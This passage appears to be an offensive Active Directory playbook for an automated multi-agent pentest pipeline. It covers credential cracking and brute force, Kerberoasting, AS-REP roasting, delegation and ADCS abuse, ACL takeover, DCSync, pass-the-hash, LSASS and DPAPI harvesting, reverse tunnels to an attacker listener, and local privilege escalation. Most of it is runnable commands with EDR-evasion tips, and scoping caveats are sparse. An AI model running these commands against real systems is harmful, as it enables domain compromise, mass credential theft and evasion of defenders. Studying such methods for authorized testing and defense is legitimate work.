hashcat -m 5600 "$RUN_DIR/creds"/*NTLMv2* /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule \
  -o "$RUN_DIR/creds/cracked_netntlm.txt"
# Targeted SSH/RDP/MSSQL brute (lockout-aware, low threads, specific accounts only)
hydra -L "$RUN_DIR/creds/domain_users.txt" -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  "$TARGET_HOST" ssh -t 4 -f -o "$RUN_DIR/creds/hydra_ssh.txt"
```
- **Indicators:** Cracked plaintext in the output file; hydra `login: ... password:` line.
- **Validation:** Re-authenticate with the cracked credential and store in vault.
- **Evasion / edge cases:** Targeted brute force against AD accounts risks lockout — prefer offline cracking of captured hashes. Reserve online brute force for local/non-AD accounts (SSH on standalone Linux, appliance logins).
- **Severity:** Enabler; severity inherited from the account cracked.
- **Dispatch:** -> NetworkServiceAgent

**Phase artifacts:** `creds/{lockout_policy,spray_*,default_*,responder*,cracked_*}.txt`, `relay/{coercer,relay_*}.txt`, vault entries per discovered credential.

**Gate-out:** At least one valid credential or relayable auth obtained (or documented that none exists), with no accounts locked out.
```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --phase credentials --status completed \
  --data "{\"creds\": $(grep -c '\[+\]' "$RUN_DIR/creds/"*.txt 2>/dev/null | paste -sd+ | bc 2>/dev/null || echo 0)}"
```

---

## Phase 5: ACTIVE DIRECTORY EXPLOITATION

**Owner:** ActiveDirectoryAgent (`directory`) · **Parallelizable:** collection then independent attack tracks (Kerberos, delegation, ACL, ADCS) run concurrently once BloodHound data exists.

**Objective & expert rationale.** Walk the trust graph from the first credential to Domain/Enterprise Admin. The expert approach is graph-first: collect with BloodHound, identify the shortest path from owned principals to high value, then execute exactly the edges on that path (Kerberos, delegation, ACL, ADCS, DCSync) rather than spraying every technique blindly. Each edge is profiled (does the misconfig actually exist for our principal?) before exploitation.

**Gate-in.** At least one valid domain credential (Phase 4); `DOMAIN`, `DOMAIN_DN`, `TARGET_DC` set.

### 5.1 BloodHound collection & shortest-path analysis

- **Objective / hypothesis:** The domain graph contains a short, exploitable path from our owned principal(s) to Domain Admin.
- **Procedure:**
```bash
# Collect from Linux with the low-priv credential
bloodhound-python -u "$LP_USER" -p "$LP_PASS" -d "$DOMAIN" -ns "$TARGET_DC" -c All,LoggedOn \
  --zip -op "$RUN_DIR/bloodhound/bh" 2>&1 | tee "$RUN_DIR/bloodhound/collect.txt"
# (Windows alt) SharpHound.exe -c All,GPOLocalGroup --zipfilename bh.zip
# Mark owned principals, then run the canonical queries in the BloodHound UI:
#  - Shortest paths to Domain Admins / Enterprise Admins
#  - Shortest paths from Owned principals
#  - Kerberoastable users with admin rights
#  - AS-REP roastable users
#  - Principals with DCSync rights
#  - Computers with unconstrained/constrained delegation
#  - Dangerous ACL edges (GenericAll/WriteDacl/WriteOwner/Owns)
```
- **Indicators:** A rendered path of <=3 hops from owned to DA; high-value edges (DCSync, GenericAll on a group, delegation).
- **Validation:** Each proposed edge is re-confirmed live with the specific tool (5.2-5.9) before claiming the path is real — BloodHound shows possibility, not certainty.
- **Evasion / edge cases:** `LoggedOn`/session collection is noisier; `--zip` plus `-c All` is the baseline. Stealth collection drops session data. Re-collect after each compromise to expand "owned."
- **Severity:** Informational (enabler), but the path it reveals is often Critical.
- **Dispatch:** -> ActiveDirectoryAgent

### 5.2 Kerberoasting

- **Objective / hypothesis:** Service accounts with SPNs have crackable TGS tickets; their RC4 hashes crack to cleartext.
- **Procedure:**
```bash
impacket-GetUserSPNs "$DOMAIN/$LP_USER:$LP_PASS" -dc-ip "$TARGET_DC" -request \
  -outputfile "$RUN_DIR/creds/kerberoast.txt"
hashcat -m 13100 "$RUN_DIR/creds/kerberoast.txt" /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule -o "$RUN_DIR/creds/kerberoast_cracked.txt"
```
- **Indicators:** `$krb5tgs$` hashes returned; cracked plaintext for a service account (often privileged).
- **Validation:** Authenticate with the cracked service-account credential; check its group membership for admin rights (cross-ref BloodHound).
- **Evasion / edge cases:** Request only specific SPNs to reduce noise (`-request-user svc_sql`). AES-only accounts crack far slower (m 19700/18200) — prioritize RC4. Targeted Kerberoast (5.7) sets an SPN on an account you control via write access.
- **Severity:** High-Critical. CVSS 3.1 `AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` (~8.0) when the account is privileged. Business impact: service accounts are frequently over-privileged and weakly passworded.
- **Dispatch:** -> ActiveDirectoryAgent

### 5.3 AS-REP roasting

- **Objective / hypothesis:** Accounts with "do not require Kerberos pre-auth" yield crackable AS-REP material without any credential.
- **Procedure:**
```bash
# With creds (enumerate flagged accounts)
impacket-GetNPUsers "$DOMAIN/$LP_USER:$LP_PASS" -dc-ip "$TARGET_DC" -request \
  -outputfile "$RUN_DIR/creds/asrep.txt"
# Without creds (against a known user list)
impacket-GetNPUsers "$DOMAIN/" -usersfile "$RUN_DIR/creds/domain_users.txt" -dc-ip "$TARGET_DC" -no-pass \
  -outputfile "$RUN_DIR/creds/asrep_nopreauth.txt"
hashcat -m 18200 "$RUN_DIR/creds/asrep.txt" /usr/share/wordlists/rockyou.txt -o "$RUN_DIR/creds/asrep_cracked.txt"
```
- **Indicators:** `$krb5asrep$` hashes; cracked plaintext.
- **Validation:** Authenticate with the cracked credential.
- **Evasion / edge cases:** The no-pass variant only needs valid usernames — pairs with 3.1/3.10 enumeration. If you have GenericWrite on a target, you can toggle DONT_REQ_PREAUTH to make it roastable (targeted AS-REP, ties to 5.7).
- **Severity:** High. CVSS ~8.1 if a privileged account is roastable. Business impact: offline credential recovery, sometimes unauthenticated.
- **Dispatch:** -> ActiveDirectoryAgent

### 5.4 Unconstrained delegation abuse

- **Objective / hypothesis:** A compromised host trusted for unconstrained delegation caches TGTs of any user who authenticates to it — including DCs (via coercion).
- **Procedure:**
```bash
# Find unconstrained-delegation hosts
impacket-findDelegation "$DOMAIN/$LP_USER:$LP_PASS" -dc-ip "$TARGET_DC" | tee "$RUN_DIR/creds/delegation.txt"
# On a compromised unconstrained host, monitor for TGTs then coerce a DC to authenticate
# Rubeus.exe monitor /interval:5 /nowrap        (Windows)
# Coerce the DC (4.4) so its TGT lands in the cache, then extract and PtT (6.2)
```
- **Indicators:** Hosts with `TRUSTED_FOR_DELEGATION`; a captured DC `MACHINE$` TGT after coercion.
- **Validation:** Use the captured DC TGT to perform DCSync (5.9) — that proves full impact.
- **Evasion / edge cases:** Requires already owning the delegation host. Printisthe classic: own the host -> coerce DC1 -> capture DC1$ TGT -> DCSync. `Protected Users` and "Account is sensitive and cannot be delegated" block specific users.
- **Severity:** Critical. CVSS ~9.0+. Business impact: single host compromise escalates to full domain via cached DC credentials.
- **Dispatch:** -> ActiveDirectoryAgent

### 5.5 Constrained delegation abuse (S4U)

- **Objective / hypothesis:** An account configured for constrained delegation (with protocol transition) can impersonate any user to its allowed SPNs.
- **Procedure:**
```bash
# Identify constrained delegation (msDS-AllowedToDelegateTo)
impacket-findDelegation "$DOMAIN/$LP_USER:$LP_PASS" -dc-ip "$TARGET_DC"
# S4U: impersonate administrator to the allowed service using the delegating account's creds/hash
impacket-getST -spn "cifs/$TARGET_HOST.$DOMAIN" -impersonate administrator \
  "$DOMAIN/svc_deleg:$SVC_PASS" -dc-ip "$TARGET_DC"
export KRB5CCNAME=administrator@cifs_${TARGET_HOST}.ccache
impacket-psexec -k -no-pass "administrator@$TARGET_HOST.$DOMAIN"
```
- **Indicators:** `findDelegation` shows `msDS-AllowedToDelegateTo`; S4U returns a usable service ticket.
- **Validation:** Authenticate to the target service with the impersonated ticket and run a command.
- **Evasion / edge cases:** Without protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION absent) you need an existing ticket to forward. The "alternate service" trick lets you swap the SPN class (cifs->host->ldap) for broader access on the same host. Protected/non-delegatable users cannot be impersonated.
- **Severity:** Critical. CVSS ~9.0. Business impact: impersonate privileged users to specific high-value services.
- **Dispatch:** -> ActiveDirectoryAgent

### 5.6 Resource-based constrained delegation (RBCD)

- **Objective / hypothesis:** Write access to a computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` (directly or via relay) lets an attacker-controlled principal impersonate any user to that computer.
- **Procedure:**
```bash
# Need: write on target computer object + control of a principal with an SPN (create one)
impacket-addcomputer "$DOMAIN/$LP_USER:$LP_PASS" -computer-name 'EVIL$' -computer-pass 'P@ssw0rd!' -dc-ip "$TARGET_DC"
impacket-rbcd "$DOMAIN/$LP_USER:$LP_PASS" -delegate-from 'EVIL$' -delegate-to "$TARGET_COMPUTER$" \
  -dc-ip "$TARGET_DC" -action write
impacket-getST -spn "cifs/$TARGET_COMPUTER.$DOMAIN" -impersonate administrator \
  "$DOMAIN/EVIL$:P@ssw0rd!" -dc-ip "$TARGET_DC"
export KRB5CCNAME=administrator@cifs_${TARGET_COMPUTER}.ccache
impacket-psexec -k -no-pass "administrator@$TARGET_COMPUTER.$DOMAIN"
```
- **Indicators:** `rbcd ... action write` succeeds; S4U returns a ticket; psexec lands as administrator on the target.
- **Validation:** Command execution as the impersonated admin on the target computer.
- **Evasion / edge cases:** `ms-DS-MachineAccountQuota` must allow computer creation (default 10) — else reuse an owned computer/SPN. RBCD is the standard follow-through for an LDAP relay (4.5). Clean up the `EVIL$` object and the delegation attribute afterward.
- **Severity:** Critical. CVSS ~9.0. Business impact: write-access-to-computer becomes admin-on-computer.
- **Dispatch:** -> ActiveDirectoryAgent

### 5.7 ACL abuse & shadow credentials

- **Objective / hypothesis:** Dangerous ACL edges (GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddSelf) let an owned principal take over users, groups, or computers.
- **Procedure:**
```bash
# Reset a user's password (ForceChangePassword / GenericAll on a user)
bloodyAD --host "$TARGET_DC" -d "$DOMAIN" -u "$LP_USER" -p "$LP_PASS" set password "victim" 'NewP@ss123!'
# Add self / a controlled user to a privileged group (GenericWrite/AddMember)
bloodyAD --host "$TARGET_DC" -d "$DOMAIN" -u "$LP_USER" -p "$LP_PASS" add groupMember "Domain Admins" "$LP_USER"
# WriteOwner -> take ownership -> grant rights (owneredit + dacledit)
impacket-owneredit -action write -new-owner "$LP_USER" -target "victim" "$DOMAIN/$LP_USER:$LP_PASS"
impacket-dacledit -action write -rights FullControl -principal "$LP_USER" -target "victim" "$DOMAIN/$LP_USER:$LP_PASS"
# Shadow Credentials (GenericWrite on a computer/user; msDS-KeyCredentialLink) -> cert -> NT hash
certipy shadow auto -u "$LP_USER@$DOMAIN" -p "$LP_PASS" -account "victim$" -dc-ip "$TARGET_DC"
# Targeted Kerberoast (GenericWrite -> set SPN, roast, remove SPN)
targetedKerberoast -d "$DOMAIN" -u "$LP_USER" -p "$LP_PASS" --dc-ip "$TARGET_DC" -o "$RUN_DIR/creds/targeted_kerb.txt"
```
- **Indicators:** Operation succeeds; shadow-cred auto returns the victim's NT hash; targeted roast returns a `$krb5tgs$` you can crack.
- **Validation:** Authenticate as the taken-over principal (PtH/login) and confirm new group membership / access.
- **Evasion / edge cases:** Prefer Shadow Credentials over password reset where possible (non-destructive, no password change to notice, works on 2016+). ALWAYS restore modified ACLs/SPNs/group memberships after proof. AdminSDHolder/protected groups re-stamp ACLs hourly.
- **Severity:** Critical. CVSS ~9.0. Business impact: ACL misconfigs are the most common real-world path to DA.
- **Dispatch:** -> ActiveDirectoryAgent

### 5.8 ADCS escalation (ESC1-ESC13, Certipy)

- **Objective / hypothesis:** A misconfigured certificate template or CA lets a low-priv user enroll a certificate that authenticates as a privileged account.
- **Procedure:**
```bash
# Enumerate vulnerable templates/CAs (all ESCs)
certipy find -u "$LP_USER@$DOMAIN" -p "$LP_PASS" -dc-ip "$TARGET_DC" -vulnerable -stdout \
  | tee "$RUN_DIR/adcs/certipy_find.txt"

# ESC1 — enrollee-supplied SAN: request a cert as DA
certipy req -u "$LP_USER@$DOMAIN" -p "$LP_PASS" -target "$CA_HOST" -ca "$CA_NAME" \
  -template "$VULN_TEMPLATE" -upn "administrator@$DOMAIN" -out "$RUN_DIR/adcs/esc1"
# ESC4 — writable template ACL: make it ESC1, then request, then revert
certipy template -u "$LP_USER@$DOMAIN" -p "$LP_PASS" -template "$VULN_TEMPLATE" -write-default-configuration \
  -target "$CA_HOST"
# ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA: any template honors SAN
certipy req -u "$LP_USER@$DOMAIN" -p "$LP_PASS" -target "$CA_HOST" -ca "$CA_NAME" -template User \
  -upn "administrator@$DOMAIN"
# ESC7 — ManageCA/ManageCertificates: add officer, enable SAN, approve own request
certipy ca -u "$LP_USER@$DOMAIN" -p "$LP_PASS" -ca "$CA_NAME" -add-officer "$LP_USER" -target "$CA_HOST"
# ESC8 — relay HTTP enrollment (pairs with coercion 4.4 / relay 4.5)
certipy relay -target "http://$CA_HOST" -template DomainController
# ESC9/ESC10 — weak/no mapping: combine with shadow creds + altname
# ESC11 — relay to ICPR (RPC) when HTTP enrollment is off
# ESC13 — issuance policy linked to a privileged group
# Authenticate with any obtained PFX -> NT hash + TGT
certipy auth -pfx "$RUN_DIR/adcs/esc1.pfx" -dc-ip "$TARGET_DC" | tee "$RUN_DIR/adcs/esc1_auth.txt"
```
- **Indicators:** `certipy find` lists `ESCx` against a template/CA; `req` returns a `.pfx`; `auth` returns the target's NT hash + a TGT.
- **Validation:** Use the recovered NT hash/TGT to perform a privileged action (DCSync 5.9 or admin login) — that proves domain impact.
- **Evasion / edge cases:** ESC8 requires coercion of a privileged account (machine/DC) onto the relay and is the most reliable instant-DA path when LDAP signing blocks other relays. After the May-2022 mapping hardening, ESC9/10 require the `szOID_NTDS_CA_SECURITY_EXT` gap. Revert any template/CA change (ESC4/ESC7) immediately. Certipy 5.x covers ESC1-16; the assignment scope is ESC1-13.
- **Severity:** Critical. CVSS 3.1 9.8 for the unauth/low-priv -> DA templates. Business impact: certificate-based domain takeover that survives password resets (the cert stays valid).
- **Dispatch:** -> ActiveDirectoryAgent

### 5.9 DCSync

- **Objective / hypothesis:** A principal with `DS-Replication-Get-Changes`/`-All` (DCSync rights) can replicate every account's hashes, including `krbtgt`.
- **Procedure:**
```bash
# Full NTLM dump (use a credential/hash that holds replication rights)
impacket-secretsdump "$DOMAIN/$ADMIN_USER@$TARGET_DC" -hashes ":$ADMIN_NT_HASH" -just-dc-ntlm \
  -outputfile "$RUN_DIR/creds/dcsync"
# Just krbtgt (for Golden Ticket persistence documentation)
impacket-secretsdump "$DOMAIN/$ADMIN_USER@$TARGET_DC" -hashes ":$ADMIN_NT_HASH" -just-dc-user krbtgt
```
- **Indicators:** Hashes for every account, including `krbtgt`, written to the output file.
- **Validation:** Use a dumped privileged hash to authenticate (PtH) and confirm access — that proves the replication worked and the hashes are valid.
- **Evasion / edge cases:** DCSync requires the replication ACE (held by DA/EA by default, or granted via ACL abuse 5.7). Targeting a single user (`-just-dc-user`) is quieter than `-just-dc`. Do not extract the full NTDS on a fragile DC without sign-off — scope to what proves impact.
- **Severity:** Critical. CVSS 3.1 `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H` (9.1). Business impact: every credential in the domain, including the keys for Golden Tickets.
- **Dispatch:** -> ActiveDirectoryAgent

### 5.10 GPO abuse

- **Objective / hypothesis:** Write access to a GPO linked to a high-value OU lets an attacker push a local-admin/script change to all linked machines.
- **Procedure:**
```bash
# GPP cleartext passwords (cpassword) in SYSVOL — read-only, instant win
nxc smb "$TARGET_DC" -u "$LP_USER" -p "$LP_PASS" -M gpp_password -M gpp_autologin \
  | tee "$RUN_DIR/creds/gpp.txt"
# Writable GPO abuse (from Linux)
pygpoabuse "$DOMAIN/$LP_USER:$LP_PASS" -gpo-id "$GPO_GUID" \
  -command "net localgroup administrators $LP_USER /add" -dc-ip "$TARGET_DC"
```
- **Indicators:** GPP `cpassword` decrypts to a cleartext password; writable GPO GUID from BloodHound; scheduled-task/script injected and applied.
- **Validation:** Confirm GPP credential by authenticating with it. For writable-GPO abuse, confirm the local-admin change applied on a linked host (then revert).
- **Evasion / edge cases:** GPP passwords use a published static AES key — always decryptable. Writable-GPO abuse affects every linked machine — scope to a single host and revert the change immediately. GPO refresh interval delays effect (force with `gpupdate` if you have a foothold).
- **Severity:** Critical. GPP cleartext -> 9.8; writable GPO -> 9.0. Business impact: mass machine compromise / a domain service account in cleartext.
- **Dispatch:** -> ActiveDirectoryAgent

**Phase artifacts:** `bloodhound/*`, `adcs/*`, `creds/{kerberoast,asrep,targeted_kerb,dcsync,gpp,delegation}*`, attack-path notes.

**Gate-out:** Shortest path to DA identified and at least one escalation edge proven (or documented as not exploitable).
```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --phase directory --status completed \
  --findings "$RUN_DIR/findings/phase5-ad.json"
```

---

## Phase 6: LATERAL MOVEMENT

**Owner:** LateralMovementAgent (`move`) · **Parallelizable:** execution attempts across hosts run in parallel; harvesting per host is independent.

**Objective & expert rationale.** Spread the foothold and harvest more material. The expert reuses Kerberos over NTLM where possible (quieter, survives PtH mitigations), picks the execution method that matches the target's logging posture, and immediately mines each new host for the next credential. Pivoting is set up early so internal-only segments are reachable.

**Gate-in.** At least one credential/hash/ticket for a target host.

### 6.1 Pass-the-Hash

- **Objective / hypothesis:** An NT hash authenticates to hosts that accept NTLM, no plaintext needed.
- **Procedure:**
```bash
# Spray a local-admin hash across the estate to find reuse
nxc smb "$SCAN_DIR/live_hosts.txt" -u administrator -H "$NT_HASH" --local-auth -x "whoami" \
  | tee "$RUN_DIR/loot/pth_local_reuse.txt"
# Domain PtH execution
impacket-wmiexec -hashes ":$NT_HASH" "$DOMAIN/administrator@$TARGET_HOST"
impacket-psexec  -hashes ":$NT_HASH" "$DOMAIN/administrator@$TARGET_HOST"
```
- **Indicators:** `(Pwn3d!)` / `[+]` from NetExec; command output returned; widespread local-admin hash reuse.
- **Validation:** Run `whoami /all` and `hostname`, capture to evidence.
- **Evasion / edge cases:** The built-in RID-500 admin can PtH even with Restricted Admin/LAPS off; non-RID-500 local admins are blocked by UAC remote restrictions unless LocalAccountTokenFilterPolicy=1. LAPS randomizes local-admin passwords — read LAPS via 5.7/LDAP if you have rights. Prefer `wmiexec`/`atexec` (no service creation) over `psexec` for stealth.
- **Severity:** High-Critical. Local-admin reuse -> 9.8 estate-wide. Business impact: one hash compromises every host sharing it.
- **Dispatch:** -> LateralMovementAgent

### 6.2 Pass-the-Ticket / Overpass-the-Hash / Pass-the-Key

- **Objective / hypothesis:** Kerberos tickets/keys grant access without NTLM, bypassing PtH mitigations and blending with normal Kerberos traffic.
- **Procedure:**
```bash
# Overpass-the-Hash: NT hash -> TGT
impacket-getTGT "$DOMAIN/administrator" -hashes ":$NT_HASH" -dc-ip "$TARGET_DC"
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass "administrator@$TARGET_HOST.$DOMAIN"
# Pass-the-Key with AES (stealthier than RC4)
impacket-getTGT "$DOMAIN/administrator" -aesKey "$AES256_KEY" -dc-ip "$TARGET_DC"
# Pass-the-Ticket: reuse a harvested .ccache/.kirbi
export KRB5CCNAME=/path/to/ticket.ccache
impacket-wmiexec -k -no-pass "administrator@$TARGET_HOST.$DOMAIN"
```
- **Indicators:** TGT obtained; `-k -no-pass` execution succeeds.
- **Validation:** Command output as the impersonated principal; confirm the ticket's principal with `klist`.
- **Evasion / edge cases:** Always reference the target by FQDN (Kerberos is name-based) or the ticket fails. AES keys avoid the RC4 "encryption downgrade" detections. Clock skew >5min breaks Kerberos — sync time. Tickets expire — note lifetimes.
- **Severity:** High-Critical. Business impact: durable, low-noise lateral movement.
- **Dispatch:** -> LateralMovementAgent

### 6.3 Remote execution methods (PsExec/WMI/WinRM/DCOM/SMB)

- **Objective / hypothesis:** Multiple execution channels exist; choose by privilege, logging, and EDR posture.
- **Procedure:**
```bash
# WinRM (clean, native; needs Remote Management Users / admin)
evil-winrm -i "$TARGET_HOST" -u administrator -H "$NT_HASH"
nxc winrm "$TARGET_HOST" -u administrator -H "$NT_HASH" -x "whoami"
# WMI (no service, no disk artifact)
impacket-wmiexec -hashes ":$NT_HASH" "$DOMAIN/administrator@$TARGET_HOST"
# DCOM (MMC20/ShellWindows/ShellBrowserWindow)
impacket-dcomexec -object MMC20 -hashes ":$NT_HASH" "$DOMAIN/administrator@$TARGET_HOST" "whoami"
# Scheduled task (atexec) / SMB service (smbexec/psexec)
impacket-atexec -hashes ":$NT_HASH" "$DOMAIN/administrator@$TARGET_HOST" "whoami"
```
- **Indicators:** Returned command output; interactive shell (evil-winrm).
- **Validation:** Capture `whoami /all`, `hostname`, and `ipconfig` to evidence per host.
- **Evasion / edge cases:** `psexec` creates a service + binary on disk (loud, EDR-flagged); `wmiexec`/`atexec`/`dcomexec` are quieter. WinRM (5985/5986) requires group membership. Pick the method matching the target's monitoring — note the choice in the report.
- **Severity:** High (enabler); severity inherited from the access gained.
- **Dispatch:** -> LateralMovementAgent

### 6.4 Credential harvesting (LSASS / SAM / DPAPI)

- **Objective / hypothesis:** Each compromised host caches additional credentials (logged-on users, local accounts, DPAPI secrets) that expand access.
- **Procedure:**
```bash
# SAM + LSA secrets + cached domain creds (local) via NetExec
nxc smb "$TARGET_HOST" -u administrator -H "$NT_HASH" --sam --lsa --dpapi \
  | tee "$RUN_DIR/loot/harvest_${TARGET_HOST}.txt"
# LSASS dump (stealthier than touching lsass directly): comsvcs / nanodump via lsassy
lsassy -d "$DOMAIN" -u administrator -H "$NT_HASH" "$TARGET_HOST" | tee "$RUN_DIR/loot/lsassy_${TARGET_HOST}.txt"
# Offline parse if you pulled a minidump
pypykatz lsa minidump "$RUN_DIR/loot/lsass.dmp" | tee "$RUN_DIR/loot/pypykatz_${TARGET_HOST}.txt"
# DPAPI mass triage (browser creds, vaults, RDP/cred manager)
donpapi -u administrator -H "$NT_HASH" -d "$DOMAIN" "$TARGET_HOST" -o "$RUN_DIR/loot/donpapi/"
```
- **Indicators:** New NT hashes / plaintexts / Kerberos keys; DPAPI-decrypted browser and credential-manager secrets.
- **Validation:** Test each new credential (PtH/login) and feed confirmed ones back into BloodHound as "owned" (re-run 5.1).
- **Evasion / edge cases:** Direct `lsass.exe` access is the most EDR-watched action — prefer `nanodump`/`comsvcs` handle-duplication or `--lsa`/`--sam` (registry, quieter). Credential Guard blocks plaintext from LSASS (you still get hashes/tickets). DPAPI backup key from the DC (5.x) decrypts any user's secrets domain-wide.
- **Severity:** High-Critical. Business impact: each host yields the next set of keys — this is the engine of lateral movement.
- **Dispatch:** -> LateralMovementAgent

### 6.5 Pivoting & tunneling (ligolo-ng / chisel / proxychains)

- **Objective / hypothesis:** Internal-only segments behind a compromised host are reachable through a tunnel, letting the full toolset run against them.
- **Procedure:**
```bash
# ligolo-ng (modern, TUN-based — best for full subnet access)
# Attacker:
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
#   (in ligolo) session; then add route to the internal subnet
sudo ip route add 10.20.0.0/16 dev ligolo
# Compromised host (agent):
# ligolo-agent.exe -connect $LISTENER_IP:11601 -ignore-cert -retry

# chisel (SOCKS over HTTP — good when only 80/443 egress)
# Attacker:
chisel server --reverse --port 8888 &
# Compromised host:
# chisel client $LISTENER_IP:8888 R:1080:socks
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
proxychains4 nxc smb 10.20.0.0/24
```
- **Indicators:** Routed reachability to internal hosts that were previously unreachable; SOCKS proxy accepting connections.
- **Validation:** `proxychains4 nmap -sT -Pn -p445 <internal-host>` returns open — proving the tunnel carries traffic into the segment.
- **Evasion / edge cases:** ligolo-ng's TUN route avoids proxychains' TCP-only/UDP limitations (DNS, ICMP work). chisel suits restrictive egress (HTTP/HTTPS only). Keep tunnels scoped to authorized subnets — a pivot is not a license to roam. Tear down all tunnels at end of engagement.
- **Severity:** Enabler; extends reach of every other technique into segmented networks.
- **Dispatch:** -> LateralMovementAgent

**Phase artifacts:** `loot/harvest_*`, `loot/lsassy_*`, `loot/donpapi/*`, `loot/pth_local_reuse.txt`, `pivot/*` (tunnel configs/routes), updated BloodHound owned set.

**Gate-out:** Lateral reach expanded; new credentials harvested and fed back to Phase 5; required internal segments tunneled.
```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --phase lateral --status completed \
  --findings "$RUN_DIR/findings/phase6-lateral.json"
```

---

## Phase 7: SINGLE-HOST PRIVILEGE ESCALATION

**Owner:** WindowsAgent (`host`) · **Parallelizable:** per-host privesc checks are independent.

**Objective & expert rationale.** When a foothold lands as a low-priv user on a host with no AD edge, escalate locally to SYSTEM/root to unlock LSASS harvesting and further movement. The expert runs an automated enumerator for breadth, then hand-verifies the two or three real candidates rather than firing every public exploit.

**Gate-in.** A shell/command channel as a non-privileged user on a host.

### 7.1 Windows local privilege escalation

- **Objective / hypothesis:** Misconfigurations (token privileges, services, registry, stored creds) allow escalation to SYSTEM.
- **Procedure:**
```bash
# Automated breadth (run on host; output to a share/evidence)
# winPEASx64.exe > winpeas.txt   |   PrivescCheck.ps1 -Extended
# Targeted high-signal checks via NetExec command exec
nxc smb "$TARGET_HOST" -u "$LP_USER" -p "$LP_PASS" -x "whoami /priv"          # SeImpersonate/SeBackup/etc.
nxc smb "$TARGET_HOST" -u "$LP_USER" -p "$LP_PASS" -x "cmdkey /list"          # stored creds
nxc smb "$TARGET_HOST" -u "$LP_USER" -p "$LP_PASS" -x "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
# SeImpersonatePrivilege -> SYSTEM (PrintSpoofer / GodPotato)
# PrintSpoofer64.exe -i -c "cmd /c whoami"     |     GodPotato.exe -cmd "cmd /c whoami"
# Unquoted service paths / weak service ACLs
nxc smb "$TARGET_HOST" -u "$LP_USER" -p "$LP_PASS" -x "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\""
```
- **Indicators:** `SeImpersonatePrivilege Enabled` (service-account foothold) -> potato to SYSTEM; `AlwaysInstallElevated=1` (HKLM and HKCU); unquoted paths with writable dirs; cached `cmdkey` creds.
- **Validation:** Run the chosen technique and capture `whoami` returning `nt authority\system`.
- **Evasion / edge cases:** SeImpersonate is the highest-value win (service accounts, IIS, MSSQL almost always have it). LAPS/EDR may block potatoes — fall back to service/registry/DLL-hijack paths. AlwaysInstallElevated needs both registry keys set.
- **Severity:** High-Critical. Local SYSTEM CVSS 3.1 `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (7.8). Business impact: full host control -> LSASS -> domain expansion.
- **Dispatch:** -> WindowsAgent

### 7.2 Linux local privilege escalation

- **Objective / hypothesis:** SUID binaries, sudo misconfig, capabilities, cron, or container escapes allow escalation to root.
- **Procedure:**
```bash
# Automated: linpeas.sh (curl through pivot/Burp-egress as needed). Targeted manual checks:
sudo -l                                   # NOPASSWD / GTFOBins-able binaries
find / -perm -4000 -type f 2>/dev/null    # SUID
getcap -r / 2>/dev/null                   # capabilities (cap_setuid, etc.)
cat /etc/crontab; ls -la /etc/cron.*      # writable cron jobs
ls -la /etc/passwd /etc/shadow            # writable passwd
uname -a; cat /etc/os-release             # kernel for exploit matching
# Container escapes
cat /proc/1/cgroup | grep -qi docker && id   # in a container?
# docker group -> root:  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
- **Indicators:** `sudo -l` lists a GTFOBins-exploitable binary; writable SUID/cron/passwd; dangerous capability; docker group membership.
- **Validation:** Execute the path and capture `id` returning `uid=0(root)`.
- **Evasion / edge cases:** Cross-reference GTFOBins for every sudo/SUID candidate before assuming non-exploitable. Kernel exploits are DoS-prone on production — sign-off and a snapshot first. NFS `no_root_squash` (3.11) is a remote->root path that belongs here too.
- **Severity:** High-Critical. Root CVSS 3.1 7.8 (local). Business impact: full host control and credential/key access.
- **Dispatch:** -> WindowsAgent

**Phase artifacts:** `loot/winpeas_*`, `loot/privesc_*`, proof screenshots of `system`/`root`.

**Gate-out:** Required hosts escalated to SYSTEM/root (or documented as not locally escalatable).
```bash
bun "$TOOLS/hunt-orchestrator.ts" --target "$TARGET" --phase host --status completed \
  --findings "$RUN_DIR/findings/phase7-host.json"
```

---

## Phase 8: EXPLOIT WEAPONIZATION

**Owner:** ExploitDevAgent (`weaponize`) · **Parallelizable:** per-CVE PoC work is independent.

**Objective & expert rationale.** For the handful of service CVEs (Phase 3.3/3.6/3.19) that have no safe, ready public exploit, develop or adapt a reliable, scoped PoC. The expert weaponizes only what materially advances the engagement, always builds and tests in a lab replica first, and prefers a non-destructive proof (version/behavior confirmation, benign command) over a crash-prone full exploit on production.

**Gate-in.** A confirmed vulnerable service version with no safe public PoC, and exploitation authorized by the RoE.

### 8.1 Exploit research & selection

- **Objective / hypothesis:** A public exploit exists or can be adapted for the confirmed CVE/version.
- **Procedure:**
```bash
for s in $(grep -oP '\d+/tcp.*' "$SVC_DIR"/ver_*.nmap | awk '{print $3,$4,$5}' | sort -u); do
  echo "=== $s ==="; searchsploit "$s" --exclude=dos
done | tee "$RUN_DIR/scans/searchsploit_full.txt"
grep -hoP 'CVE-\d{4}-\d+' "$SVC_DIR"/*.txt "$SCAN_DIR"/*.nmap 2>/dev/null | sort -u > "$RUN_DIR/scans/cve_list.txt"
# Metasploit check-only modules where available (no payload)
msfconsole -q -x "use <module>; set RHOSTS $TARGET_HOST; check; exit"
```
- **Indicators:** A matching exploit ID; a `check` returning "appears vulnerable".
- **Validation:** Confirm version-to-CVE mapping precisely (build numbers, not just product) before committing dev effort.
- **Evasion / edge cases:** `--exclude=dos` filters crash-only entries. Prefer `check`-only verification on production; full exploitation in lab.
- **Severity:** Inherited from the target CVE.
- **Dispatch:** -> ExploitDevAgent

